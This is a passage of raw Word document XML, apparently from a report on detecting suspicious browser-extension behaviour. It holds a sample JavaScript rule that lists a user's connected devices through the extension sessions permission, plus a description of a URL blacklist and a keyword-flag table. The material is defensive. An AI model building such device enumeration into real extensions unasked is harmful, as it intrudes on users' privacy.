                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(devices){</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="808080"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>// set html</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="808080"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>document.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>getElementById</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>'num-devices'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>).</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>innerHTML</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>devices.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>length</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">var </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>device_names</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>" "</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>devices.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>forEach</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(device) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>device_names</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>device_names</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> + device.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">info </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">+ </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>" "</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>})</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>document.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>getElementById</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>'devices'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>).</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>innerHTML</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>device_names</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="009A03A2">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6C45EE90" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D" w:rsidP="007652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2"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="6036F68B" w14:textId="48180001" w:rsidR="006A6E3D" w:rsidRPr="009A03A2" w:rsidRDefault="006A6E3D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 10: User’s sessions information.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="204"/>
    </w:p>
    <w:p w14:paraId="1AFCD823" w14:textId="4C4AF6B9" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="205" w:name="_Ref514844115"/>
      <w:bookmarkStart w:id="206" w:name="_Toc523071588"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:t>: User’s sessions information.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="205"/>
      <w:bookmarkEnd w:id="206"/>
    </w:p>
    <w:p w14:paraId="70FC76DA" w14:textId="77777777" w:rsidR="00CD3A7F" w:rsidRDefault="00F66EC0" w:rsidP="00C518F8">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>This rule uses the sessions permission to get information about the user’s connected devices.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627501F1" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DD868B2" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00CD3A7F" w:rsidP="00CD3A7F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="207" w:name="_Toc523071524"/>
      <w:r w:rsidRPr="00CD3A7F">
        <w:t>Use of blacklisted URLs.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="207"/>
    </w:p>
    <w:p w14:paraId="4222BBC2" w14:textId="6CF8F3EC" w:rsidR="00CD3A7F" w:rsidRDefault="00C518F8" w:rsidP="009A03A2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In addition to the rules, we created a blacklist to detect malicious/suspicious URLs. </w:t>
      </w:r>
      <w:r w:rsidR="00CD3A7F" w:rsidRPr="00CD3A7F">
        <w:t>First, we identify all the URLs used in the extension</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidR="00CD3A7F" w:rsidRPr="00CD3A7F">
        <w:t xml:space="preserve"> we check for reversed URLs. </w:t>
      </w:r>
      <w:r w:rsidR="00CD3A7F" w:rsidRPr="00CD3A7F">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">When a URL is found, we check if it is included </w:t>
      </w:r>
      <w:r w:rsidR="00C74967">
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidR="00CD3A7F" w:rsidRPr="00CD3A7F">
        <w:t xml:space="preserve"> our blacklist and in case of a match, we print a warning message to inform the user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4989E881" w14:textId="43179D49" w:rsidR="00F5383F" w:rsidRPr="004B2E0D" w:rsidRDefault="00F5383F" w:rsidP="00F5383F">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="208" w:name="_Toc523071591"/>
      <w:r w:rsidRPr="004B2E0D">
        <w:t xml:space="preserve">Table </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="004B2E0D">
        <w:instrText xml:space="preserve"> SEQ Table \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="004B2E0D">
        <w:t>Matching every c</w:t>
      </w:r>
      <w:r w:rsidR="004B2E0D" w:rsidRPr="00C518F8">
        <w:t xml:space="preserve">all </w:t>
      </w:r>
      <w:r w:rsidR="004B2E0D">
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="004B2E0D" w:rsidRPr="00C518F8">
        <w:t xml:space="preserve">xpression, </w:t>
      </w:r>
      <w:r w:rsidR="004B2E0D">
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidR="004B2E0D" w:rsidRPr="00C518F8">
        <w:t>ariable declaration and keyword</w:t>
      </w:r>
      <w:r w:rsidR="004B2E0D">
        <w:t xml:space="preserve"> with a flag.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="208"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable1Light1"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5980"/>
        <w:gridCol w:w="2394"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00C518F8" w14:paraId="4D6FEFDE" w14:textId="77777777" w:rsidTr="00C518F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80" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4AA96D56" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00C518F8">
              <w:t xml:space="preserve">Call </w:t>
            </w:r>
            <w:r w:rsidR="004B2E0D">
              <w:t>e</w:t>
            </w:r>
            <w:r w:rsidRPr="00C518F8">
              <w:t xml:space="preserve">xpressions, Variable declarations and </w:t>
            </w:r>
            <w:r w:rsidR="004B2E0D">
              <w:t>K</w:t>
            </w:r>
            <w:r w:rsidRPr="00C518F8">
              <w:t>eywords</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2394" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="60D4593A" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00C518F8" w:rsidRDefault="00C518F8" w:rsidP="00C518F8">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
